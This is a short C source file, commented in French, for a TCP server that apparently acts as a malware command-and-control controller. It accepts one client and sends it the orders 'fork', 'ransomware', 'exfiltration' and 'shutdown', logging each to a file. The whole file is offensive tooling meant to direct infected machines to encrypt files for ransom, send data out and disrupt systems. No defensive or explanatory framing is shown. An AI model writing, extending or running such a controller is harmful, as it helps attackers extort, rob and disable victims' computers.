#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>

void log_to_file(const char *message) {
    FILE *log_file = fopen("server_logs.txt", "a");
    if (log_file == NULL) {
        perror("Failed to open log file");
        return;
    }
    fprintf(log_file, "%s\n", message);
    fclose(log_file);
}

int main() {
    int server_socket, client_socket;
    struct sockaddr_in server_addr, client_addr;
    socklen_t client_len;
    char buffer[1024];
    char *client_id = "7aB9X3rL";  // Client ID pour l'exemple
    char *orders[] = {"fork", "ransomware", "exfiltration", "shutdown"};
    int order_count = 4;  // Nombre d'ordres à envoyer

    server_socket = socket(AF_INET, SOCK_STREAM, 0);
    if (server_socket < 0) {
        perror("Server socket creation failed");
        exit(1);
    }

    server_addr.sin_family = AF_INET;
    server_addr.sin_addr.s_addr = INADDR_ANY;
    server_addr.sin_port = htons(8080);

    if (bind(server_socket, (struct sockaddr*)&server_addr, sizeof(server_addr)) < 0) {
        perror("Bind failed");
        close(server_socket);
        exit(1);
    }

    if (listen(server_socket, 5) < 0) {
        perror("Listen failed");
        close(server_socket);
        exit(1);
    }

    printf("Server listening on port 8080...\n");

    client_len = sizeof(client_addr);
    client_socket = accept(server_socket, (struct sockaddr*)&client_addr, &client_len);
    if (client_socket < 0) {
        perror("Server accept failed");
        close(server_socket);
        exit(1);
    }

    log_to_file("Client connected.");

    // Envoi des ordres dans une boucle
    for (int i = 0; i < order_count; i++) {
        send(client_socket, orders[i], strlen(orders[i]) + 1, 0);  // +1 pour inclure le caractère nul '\0'
        char log_message[256];
        snprintf(log_message, sizeof(log_message), "Order sent: %s", orders[i]);
        log_to_file(log_message);  // Log l'ordre envoyé
        printf("Order sent: %s\n", orders[i]);
        sleep(1);  // Attendre un peu entre les ordres pour ne pas tout envoyer trop vite
    }

    // Terminer la communication après l'envoi de tous les ordres
    log_to_file("All orders sent. Closing connection.");
    printf("All orders sent. Closing connection.\n");

    close(client_socket);
    close(server_socket);

    return 0;
}
